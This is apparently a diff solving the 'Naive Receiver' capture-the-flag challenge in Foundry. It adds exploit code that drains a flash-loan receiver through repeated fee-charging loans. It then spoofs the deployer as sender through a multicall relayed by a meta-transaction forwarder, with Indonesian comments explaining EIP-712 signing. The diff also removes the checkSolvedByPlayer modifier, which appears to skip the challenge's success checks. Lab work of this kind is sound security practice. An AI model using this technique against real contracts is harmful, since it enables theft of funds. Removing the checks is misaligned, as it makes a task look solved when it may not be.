@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -76,10 +78,45 @@ contract NaiveReceiverChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_naiveReceiver() public checkSolvedByPlayer {
-        
+    
+    function test_naiveReceiver() public {
+        bytes[] memory callDatas = new bytes[](11);
+        for(uint8 i; i<10; i++){
+            callDatas[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
+        }
+        callDatas[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), bytes32(uint256(uint160(deployer))));        
+        bytes memory message = abi.encodeCall(pool.multicall, callDatas);
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 30000000,
+            nonce: forwarder.nonces(player),
+            data: message,
+            deadline: 1 days
+        });
+
+        /*
+        "\x19\x01": Ini adalah urutan byte yang digunakan dalam EIP-712 sebagai bagian dari prefiks yang ditambahkan pada pesan sebelum proses penandatanganan. Prefiks ini membantu memastikan bahwa tanda tangan yang dibuat hanya berlaku untuk format pesan tertentu dan tidak dapat digunakan untuk jenis pesan lainnya.
+        "\x19": Ini adalah byte yang menunjukkan bahwa pesan ini menggunakan format EIP-191, yang adalah standar Ethereum untuk penandatanganan pesan.
+        "\x01": Ini adalah byte yang menunjukkan bahwa format pesan yang digunakan adalah EIP-712.
+        forwarder.domainSeparator(): Ini adalah nilai yang mewakili domain yang mengidentifikasi kontrak atau aplikasi yang membuat tanda tangan.
+        forwarder.getDataHash(request): Ini adalah hash dari data yang ingin ditandatangani.
+        */
+
+       bytes32 messageHash = keccak256(abi.encodePacked(
+        "\x19\x01", // mengikuti aturan eip712
+        forwarder.domainSeparator(),
+        forwarder.getDataHash(request)
+       ));
+
+       (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, messageHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
     }
 
+    
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
